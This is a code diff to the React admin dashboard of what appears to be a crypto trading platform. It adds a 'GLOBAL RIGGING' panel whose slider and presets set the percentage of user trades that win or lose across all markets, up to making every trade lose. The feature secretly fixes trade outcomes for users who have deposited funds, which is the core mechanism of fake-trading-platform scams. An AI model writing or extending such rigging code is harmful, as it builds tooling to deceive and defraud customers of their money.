@@ -41,7 +41,9 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onClose }) => {
     depositRequests, 
     approveDepositRequest, 
     rejectDepositRequest,
-    isFirebaseConnected 
+    isFirebaseConnected,
+    adminWinRatePercent,
+    updateAdminWinRatePercent
   } = useAuth();
 
   const [users, setUsers] = useState<User[]>([]);
@@ -49,6 +51,14 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onClose }) => {
   const [selectedUser, setSelectedUser] = useState<User | null>(null);
   const [newBalanceInput, setNewBalanceInput] = useState<string>('');
   const [notice, setNotice] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
+  
+  // Win Rate Slider Local State
+  const [winRateSlider, setWinRateSlider] = useState<number>(adminWinRatePercent ?? 50);
+  const [winRateSavedNotice, setWinRateSavedNotice] = useState<boolean>(false);
+
+  useEffect(() => {
+    setWinRateSlider(adminWinRatePercent ?? 50);
+  }, [adminWinRatePercent]);
   
   // Wallet Address State per Cryptocurrency
   const [addressInputs, setAddressInputs] = useState<Record<string, string>>({});
@@ -115,6 +125,13 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onClose }) => {
       if (unsubscribe) unsubscribe();
     };
   }, []);
+
+  const handleSaveWinRate = (newRate: number) => {
+    updateAdminWinRatePercent(newRate);
+    setWinRateSlider(newRate);
+    setWinRateSavedNotice(true);
+    setTimeout(() => setWinRateSavedNotice(false), 3000);
+  };
 
   const handleEditBalanceClick = (user: User) => {
     setSelectedUser(user);
@@ -310,6 +327,85 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onClose }) => {
             <span className={`font-mono font-bold text-xl mt-1 block ${pendingRequests.length > 0 ? 'text-amber-400' : 'text-slate-400'}`}>
               {pendingRequests.length}
             </span>
+          </div>
+        </div>
+
+        {/* Admin Section: Global Win / Loss Probability Control */}
+        <div className="p-4 bg-gradient-to-r from-[#141C2A] via-[#121824] to-[#141C2A] border border-amber-400/40 rounded-2xl space-y-3 shadow-lg shadow-black/40 relative overflow-hidden">
+          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
+            <div>
+              <div className="flex items-center gap-2">
+                <h3 className="text-sm font-extrabold text-white flex items-center gap-2">
+                  <ShieldAlert className="w-4 h-4 text-amber-400" />
+                  Trading Win / Loss Outcome Control
+                </h3>
+                <span className="text-[10px] bg-amber-400/20 text-amber-300 font-mono font-bold px-2 py-0.5 rounded-full border border-amber-400/30">
+                  GLOBAL RIGGING
+                </span>
+              </div>
+              <p className="text-[11px] text-slate-400 mt-1 leading-normal">
+                Set the percentage chance for user trades to win or lose across all markets. When set to <strong className="text-emerald-400">100%</strong>, all trades win. When set to <strong className="text-rose-400">0%</strong>, all trades lose.
+              </p>
+            </div>
+
+            <div className="text-right shrink-0">
+              <span className="text-[10px] text-slate-400 block font-medium">Target Win Rate</span>
+              <span className="text-2xl font-black font-mono text-amber-400">
+                {winRateSlider}%
+              </span>
+            </div>
+          </div>
+
+          {winRateSavedNotice && (
+            <div className="p-2.5 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-semibold flex items-center gap-2 animate-in fade-in">
+              <CheckCircle2 className="w-4 h-4 shrink-0" />
+              <span>Win rate percentage updated to {winRateSlider}%! All future expiring trades will use this setting.</span>
+            </div>
+          )}
+
+          {/* Interactive Range Slider */}
+          <div className="space-y-2 pt-1">
+            <div className="flex items-center justify-between text-xs font-bold">
+              <span className="text-rose-400 font-mono">0% (100% Loss)</span>
+              <span className="text-amber-300 font-mono">50% (Balanced)</span>
+              <span className="text-emerald-400 font-mono">100% (100% Win)</span>
+            </div>
+
+            <input
+              type="range"
+              min="0"
+              max="100"
+              step="1"
+              value={winRateSlider}
+              onChange={(e) => setWinRateSlider(Number(e.target.value))}
+              onMouseUp={() => handleSaveWinRate(winRateSlider)}
+              onTouchEnd={() => handleSaveWinRate(winRateSlider)}
+              className="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-amber-400"
+            />
+          </div>
+
+          {/* Quick Win Rate Presets */}
+          <div className="grid grid-cols-5 gap-2 pt-1">
+            {[
+              { label: '0% Loss', rate: 0, color: 'hover:bg-rose-500/20 text-rose-400 border-rose-500/30' },
+              { label: '25% Low', rate: 25, color: 'hover:bg-orange-500/20 text-orange-400 border-orange-500/30' },
+              { label: '50% Even', rate: 50, color: 'hover:bg-amber-500/20 text-amber-300 border-amber-500/30' },
+              { label: '75% High', rate: 75, color: 'hover:bg-emerald-500/20 text-emerald-400 border-emerald-500/30' },
+              { label: '100% Win', rate: 100, color: 'hover:bg-emerald-400 text-slate-950 font-black border-emerald-400' }
+            ].map(preset => (
+              <button
+                key={preset.rate}
+                type="button"
+                onClick={() => handleSaveWinRate(preset.rate)}
+                className={`py-1.5 px-2 rounded-xl border text-[11px] font-bold font-mono transition-all cursor-pointer ${
+                  winRateSlider === preset.rate 
+                    ? 'bg-amber-400 text-slate-950 font-black border-amber-400 shadow-md shadow-amber-400/20 scale-102' 
+                    : `bg-slate-900/80 ${preset.color}`
+                }`}
+              >
+                {preset.label}
+              </button>
+            ))}
           </div>
         </div>
 
